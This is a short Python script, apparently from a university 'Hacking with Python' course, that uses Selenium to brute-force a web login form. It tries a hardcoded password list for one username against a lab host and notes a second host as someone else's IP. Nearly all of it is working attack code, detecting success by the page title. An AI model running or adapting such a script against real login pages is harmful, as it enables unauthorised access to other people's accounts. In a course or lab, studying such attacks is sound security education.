# selenium eigentlich zum Testen von Webseiten aber auch Bruteforce mlg
# pip install selenium, webdriver
# https://googlechromelabs.github.io/chrome-for-testing/   Chrome Version 147.0.7727.102
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.by import By 
import time
#from webdriver_manager.chrome import ChromeDriverManager

print("Selenium Bruteforce")
s = Service(executable_path=r"C:\Users\kevin\OneDrive\Desktop\6. Semester\Hacking with Python\chromedriver-win64\chromedriver.exe")
driver = webdriver.Chrome(service=s)

website = "http://141.87.56.119:5000/login"
website2 = "http://141.87.56.58:5001/login" #fremde IP
driver.get(website)

# wordlist verwenden - da hardware hier sehr begrenzt, wird wordlist mit array simuliert 
passwords = ["1234", "password", "de", "test", "password2026", "admin"]
username = "de" 
for passw in passwords:
    driver.get(website)
    time.sleep(5)
    print("=======================")
    print(f"Trying Password: {passw}")

    res = driver.find_elements(By.CLASS_NAME, "form-control")

    print(f"Check {len(res)}")

    time.sleep(5)
    
    #res[0].clear()
    res[0].send_keys(username) # username hier eingeben

    #res[1].clear()
    res[1].send_keys(passw)

    button = driver.find_elements(By.CLASS_NAME, "btn")
    print(f"Check 2 {len(button)}")

    button[0].click()

    print(f"Pagetitel: {driver.title}, try next Password...")
    if driver.title != "Login":
        print(f"Password found: {passw}")
        print(f"Username: {username}")
        break

driver.quit()